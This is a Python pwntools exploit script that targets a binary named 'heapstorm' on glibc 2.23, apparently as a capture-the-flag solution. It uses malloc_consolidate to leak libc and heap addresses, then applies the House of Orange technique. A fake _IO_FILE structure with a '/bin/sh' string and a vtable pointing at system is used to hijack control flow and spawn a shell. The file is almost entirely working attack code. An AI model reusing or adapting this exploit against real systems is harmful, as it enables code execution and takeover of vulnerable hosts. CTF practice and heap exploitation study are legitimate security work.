#malloc_consolidate + house of orange
from pwn import *
import sys, os
context.log_level = 'debug'
prog = './heapstorm'
elf = ELF(prog)
p = process(prog)
libc = ELF("./libc-2.23.so")
#p = remote("")
def dbg():
    gdb.attach(p)
    p.interactive()

def add(idx, content):
	p.sendlineafter("Choice:", '1')
	p.sendlineafter("size:", str(idx))
	p.sendafter("content:", content)
def show(idx):
	p.sendlineafter("Choice:", '2')
	p.sendlineafter("index:", str(idx))
def free(idx):
	p.sendlineafter("Choice:", '3')
	p.sendlineafter("index: ", str(idx))
def con():
	p.sendlineafter("Choice:", '1'*0x500)
def exp():
	for i in range(4):	
		add(0x37, 'a'*0x37)
	add(0x37, 'a'*0x20+p64(0)+p64(0x41)+'a'*7)
	add(0x37, 'f'*0x37)#5 140
	add(0x37, (p64(0)+p64(0x41))*3+'\n')#6 180
	add(0x37, (p64(0)+p64(0x41))*3+'\n')#7
	for i in range(5):
		free(i)
	con()
	add(0x28, 'a'*0x28)#0
	add(0x37, 'b'*0x37)#1 30
	add(0x37, 'c'*0x37)#2 70
	add(0x37, 'd'*0x37)#3 b0
	add(0x37, 'e'*0x37)#4 f0
	free(5)	
	free(1)
	con()	
	add(0x17, 'b'*0x17)#1
	add(0x17, 'b'*0x17)#5
	show(2)
	libc_base = u64(p.recvuntil("\x7f")[-6:]+'\x00'*2)-0x3c4b78
	log.success("libc_base == >" + hex(libc_base))
	io_list = libc_base + libc.sym['_IO_list_all']
	add(0x17, 'c'*0x17)#8(2)
	add(0x17, 'c'*0x17)#9(2)
	free(9)
	free(8)
	show(2)
	heap_base = u64(p.recvline_startswith("Content")[-6:]+'\x00'*2)-0x90
	log.success("heap_base == >" + hex(heap_base))	
	add(0x20, 'a\n')
	add(0x10, 'a\n')
	add(0x10, 'a\n')
	add(0x18, p64(0) + p64(0x41)+'\n')
	add(0x30, p64(0)*5+p64(0x41)+'\n')#12
	add(0x30, '\n')	
	free(4)
	add(0x30, p64(0)+p64(0x91)+'\n')
	free(12)
	free(4)
	fake_file = '/bin/sh\x00' + p64(0x61)
	fake_file += p64(0) + p64(io_list-0x10)
	fake_file += p64(0) + p64(1) #bypass check
	add(0x37, fake_file+'\n')
	free(7)
	add(0x30, p64(0)+p64(heap_base + 0x1c8)+p64(libc_base+libc.sym['system'])+'\n')	#fake_vtable
	dbg()
	p.interactive()
if __name__ == '__main__':
	exp()
